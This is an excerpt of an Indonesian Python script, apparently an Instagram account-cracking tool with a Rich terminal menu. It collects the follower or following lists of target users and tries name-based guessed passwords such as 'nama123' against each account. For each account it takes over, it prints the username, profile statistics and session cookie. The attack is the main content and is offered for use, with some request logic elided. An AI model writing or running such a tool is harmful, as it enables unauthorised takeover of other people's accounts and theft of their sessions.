...
def CetakBanner(ulfahsadiyah,asu):
    Console(width=40).print(Panel(ulfahsadiyah,style=asu),justify='center')

def ulfah(kaya,kontol):
    Console(width=40).print(Panel(kaya,style=kontol))
...
╔║║╣╚╗║
╚══╩══╝
[bold white]MADE BY INDONESIA CODER
[bold green] Di record oleh [bold GREEN]RegiGiyaa[bold purple]''','color(8)')

def masuk():
    os.system('clear');banner()
    ulfah('[bold green]masukan cookies akun instagram kamu, pastikan memakai akun tumbal','color(8)')
...
# BOT E NYONG OJO DIGANTI NEK DIGANTI OTW MOKAD
...
def menu():
    ...
    os.system('clear')
    banner()
    ulfah(f'''[bold purple][bold white]├──[bold red] Welcome   : [bold red]{nama}
[bold purple][bold white]├──[bold red] Followers : [bold red]{wers}
[bold purple][bold white]├──[bold red] Following : [bold red]{wing}''','color(8)')
    ulfah('''[bold red]├──Crack dari followers
[bold red]├──Crack dari following
[bold white]├──Check hasil crack
[bold white]├── Keluar...''','color(8)')
    cuih = input(f'  {H}{H}├──Pilih Menu : {H}')
    if cuih in ['1','01']:
        ulfah('[bold purple] masukan username target, kamu juga bisa gunakan tanda koma untuk pemisahan contoh name1,name2','color(8)')
        ...
        afah,iyah=[],0
        ulfah('[bold purple][[bold green]1[bold purple]] chek hasil akun [bold green]OK\n[bold white][[bold green]2[bold purple]] chek hasil akun [bold yellow]CP','color(8)')
...
class dump:
    ...
    def selanjutnya(self, kontol):
        ...
        ulfah('''[bold white][bold white]├──[bold red] sandi : nama,nama123
[bold white][bold white]├──[bold red] sandi : nama,nama1234,nama12345
[bold white][bold white]├──[bold red] sandi : nama,nama123,nama1234,nama12345 ++''','color(8)')
        sandi = input(f'  {H} {N}├──pilih menu : {H}')
        if sandi in ['3','03']:
           ulfah('[bold purple]gunakan tanda koma untuk pemisahan contoh password1,password2','color(8)')
    ...
    def crack(self, user, pwx):
        global ok,cp,loop
        sys.stdout.write(f'\r {H} {N}[ MANI ]  : {loop}/{len(self.id)} OK:{len(ok)} CP:{len(cp)}');sys.stdout.flush()
        for pw in pwx:
             try:
                   i = requests.Session()
...
#                   i.headers.update({'x-csrftoken':i.cookies['csrftoken']})
                   if 'userId' in sydh:
                       ...
                       print(f'''\r
   {H} • STATUS {N}  : {H}LIVE              
 {H}   • USER NAME {N}  : {H}{nama}
 {H}   • FOLLOWERS {N}   : {H}{pengikut}
 {H}   • FOLLOWINGS{N}   : {H}{mengikut}
 {H}   • POST'S{N}      :  {H}{postingan}
 {H}   • COOKIE{N}      : {H}{coki} ''')
